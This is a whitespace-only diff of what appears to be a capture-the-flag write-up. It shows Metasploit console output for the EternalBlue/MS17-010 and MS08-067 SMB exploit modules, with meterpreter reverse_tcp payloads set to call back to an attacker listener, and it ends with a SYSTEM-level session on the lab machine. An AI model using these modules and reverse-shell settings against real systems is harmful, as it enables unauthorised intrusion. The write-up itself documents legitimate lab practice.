@@ -150,13 +150,13 @@ Matching Modules
 ================
 
    #  Name                                      Disclosure Date  Rank     Check  Description
+
    -  ----                                      ---------------  ----     -----  -----------
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
-
 
 Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
 
@@ -182,7 +182,6 @@ Module options (exploit/windows/smb/ms17_010_psexec):
    SMBPass                                                                               no        The password for the specified username
    SMBUser                                                                               no        The username to authenticate as
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -191,14 +190,11 @@ Payload options (windows/meterpreter/reverse_tcp):
    LHOST     tun0             yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Automatic
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -250,9 +246,9 @@ Matching Modules
 ================
 
    #  Name                                 Disclosure Date  Rank   Check  Description
+
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
-
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
 
@@ -268,7 +264,6 @@ Module options (exploit/windows/smb/ms08_067_netapi):
    RPORT    445              yes       The SMB service port (TCP)
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -277,14 +272,11 @@ Payload options (windows/meterpreter/reverse_tcp):
    LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Automatic Targeting
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -303,6 +295,5 @@ Server username: NT AUTHORITY\SYSTEM
 ```
 
 Both exploits work!
-
 
 ![](machine_pwned.png){: width="65%" .normal}
